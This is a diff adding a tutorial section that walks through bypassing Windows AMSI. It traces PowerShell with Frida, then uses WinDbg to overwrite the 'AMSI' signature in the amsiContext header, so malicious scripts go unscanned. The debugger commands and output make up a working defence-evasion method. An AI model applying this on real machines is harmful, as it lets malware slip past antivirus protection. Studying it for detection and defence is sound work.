@@ -82,10 +82,78 @@ AMSI_RESULT *result -> pointer to a storage buffer for the scan result, a enum t
 Once Scan is complete, AmsiCloseSession is called to close the AMSI scanning session.
 
 ## Hook your powershell with Frida
-Frida is a opensource tool allow us to hook Win32APi through a python backend and display the result(return values, input arguments) with JavaScript. If we want to learn more ASMI behavior, we have hook the powershell with Frida to observe the API calls.
+Frida is a opensource tool allow us to hook a process and watch Win32APi through a python backend and display the result(return values, input arguments) with JavaScript. If we want to learn more ASMI behavior, we have hook the powershell with Frida to observe the API calls.
 
-Setting up Frida
+#### Setting up Frida
 - 1.install python
 - 2.install pip with python3 [get-pip.py](/05FightAdvancedAntivirus/get-pip.py)
 - 3.install Frida with pip install frida-tools
 - 4.add Frida tools to your PATH environment, it should be something like  C:\Users\mst\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.9_qp0\LocalCache\local-packages\Python39\Scripts;
+
+#### Montior process(powershell) with Frida
+- 1.Start a 64 bit powershell process and get the process ID ```Get-Process -Name powershell```
+- 2.Open command prompt, and run ```frida-trace -p powershellPID -x amsi.dll -i Amsi* ``` 
+- 3.modify the defult javascript output format, so what can get input/output values. In our case, we want to know what is going on with AmsiScanBuffer located at **C:\Users\\mst\__handlers__\amsi.dll\AmsiScanBuffer.js** [AmsiScanBuffer.js](/05FightAdvancedAntivirus/AmsiScanBuffer.js)
+- 4.Now you can interact with powershll process and watch the API calls.
+
+## Destory amsiContext header to Bypass AMSI
+Now we got everything set up, we can test our ttps to bypass AMSI. recall AmsiInitialize API has a argument amsiContext, a pointer to a context structure. The context structure is used for rest of the APIs call in asmi.dll. We will use Frida to locate context structure address in memory and then use WinDbg to inspect its content. 
+- 1.run fria-trace to examin pwoershell command input, after typing a test input in powershell you will find amsiContext address  in frida
+```
+ 3087 ms  [*] AmsiScanBuffer()
+ 3087 ms  |- amsiContext: 0x1774c453c00
+ 3087 ms  |- buffer: { Set-StrictMode -Version 1; $_.ErrorCategory_Message }
+```
+- 2.Attached powershell to WinDbg and dump memory at 0x1774c453c00, identify AMSI static string at first four bytes. Thayt is intersting.
+```
+0:017> dc 0x1774c453c00
+00000177`4c453c00  49534d41 00000000 32330e00 00000177  AMSI......32w...
+00000177`4c453c10  4c581650 00000177 000026e0 00000000  P.XLw....&......
+```
+- 3.Let's unassemble the AmsiOpenSession function from the AMSI module and maybe we can determine if the first four bytes are being referenced in any way
+```
+0:017> u amsi!AmsiOpenSession
+amsi!AmsiOpenSession:
+00007ffb`2aa33560 e9a3cb8f0b      jmp     00007ffb`36330108
+00007ffb`2aa33565 4885c9          test    rcx,rcx
+00007ffb`2aa33568 7442            je      amsi!AmsiOpenSession+0x4c (00007ffb`2aa335ac)
+00007ffb`2aa3356a 8139414d5349    cmp     dword ptr [rcx],49534D41h
+00007ffb`2aa33570 753a            jne     amsi!AmsiOpenSession+0x4c (00007ffb`2aa335ac)
+00007ffb`2aa33572 4883790800      cmp     qword ptr [rcx+8],0
+00007ffb`2aa33577 7433            je      amsi!AmsiOpenSession+0x4c (00007ffb`2aa335ac)
+00007ffb`2aa33579 4883791000      cmp     qword ptr [rcx+10h],0
+```
+hum, intersting, on line 4, you see the asembley code ```00007ffb`2aa3356a 8139414d5349    cmp     dword ptr [rcx],49534D41h``` a compare opcode is called, recall in x64 process, rcx is the first arugment of the function. The opcode is comparing the first function argument to a hex string 49534D41, which we know the ASCII repersentation of 49534D41h is AMSI. And the next instruction, ```jne     amsi!AmsiOpenSession+0x4c (00007ffb`2aa335ac)``` redirect the program flow to **amsi!AmsiOpenSession+0x4c** if the argument is not equale to 49534D41h/AMSI.
+- 4.We can dig a little deeper to see what is in memory address **amsi!AmsiOpenSession+0x4c** using u command to display the instructions at desired address
+```
+0:017> u amsi!AmsiOpenSession+0x4C L3
+amsi!AmsiOpenSession+0x4c:
+00007ffb`2aa335ac b857000780      mov     eax,80070057h
+00007ffb`2aa335b1 c3              ret
+00007ffb`2aa335b2 cc              int     3
+```
+Intersting at address amsi!AmsiOpenSession+0x4c(00007ffb`2aa335ac), the instuction move hex value 80070057h into eax, recall eax store function's return variable. And We can see the next instruction is ret, return. Recall  AmsiOpenSession has a return type [HRESULT](https://docs.microsoft.com/en-us/windows/win32/seccrypto/common-hresult-values), quick googling, we find out that 80070057h is E_INVALIDARG, meaning one or more arguments are not valid.
+
+- 5.If we can modify the rcx, the first argument to anything but ASMI, we redirect the AmsiOpenSession API to return error, maybe we could bypass the ASMI scan? Let's give it a try.we’ll place a breakpoint on AmsiOpenSession and trigger it by entering a PowerShell command. Once the breakpoint has been triggered, we’ll use ed to modify the first
+four bytes of the context structure, and let execution continue
+
+```
+0:017> bp amsi!AmsiOpenSession
+0:017> g
+Breakpoint 0 hit
+*** WARNING: Unable to verify checksum for C:\WINDOWS\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\7242d51cdca2ff9f6522a0c081fa3c4a\System.Management.Automation.ni.dll
+amsi!AmsiOpenSession:
+00007ffb`2aa33560 e9a3cb8f0b      jmp     00007ffb`36330108
+0:009> dc rcx L1
+00000177`4c453c00  49534d41                             AMSI
+0:009> ed rcx 0
+0:009> dc rcx L1
+00000177`4c453c00  00000000                             ....
+0:009> g
+(868c.6d80): CLR exception - code e0434352 (first chance)
+(868c.6d80): CLR exception - code e0434352 (first chance)
+```
+- 6.Let's run a malicious string in powershell, you will see on the left powershell process it print the malicious stirng with our bypass TTP. By corrupting the amsiContext header, we have effectively shut down AMSI without affecting PowerShell. We have effectively bypassed AMSI. Very nice.
+
+![image](https://user-images.githubusercontent.com/24555370/144694463-24e66adb-4afc-4867-948d-094dd8f74e3f.png)
+
